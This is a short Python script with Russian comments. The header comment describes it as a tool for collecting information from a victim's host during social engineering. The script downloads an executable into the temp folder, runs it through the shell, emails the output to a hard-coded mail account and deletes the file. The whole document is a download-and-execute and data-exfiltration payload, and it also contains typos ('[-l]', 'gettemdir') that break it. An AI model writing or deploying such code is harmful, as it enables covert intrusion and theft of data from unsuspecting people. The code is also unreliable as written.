#!/usr/bin/env python
# помогает в сборе информации с хоста жертвы при соц инженерии, например. 
import tempfile, subprocess, smtplib, requests, os

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-l]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettemdir()
os.chdir(temp_directory)
download("https://google.com/image/image.exe")  #тут скачиваем файл
command = "image.exe all"  #задаем переменную команды
result = subprocess.check_output(command, shell=True) #тут запускаем файл
send_mail("email@mail.mail", "password", result)    # указываешь креды для отправки отчета на почту. 
os.remove("image.exe")
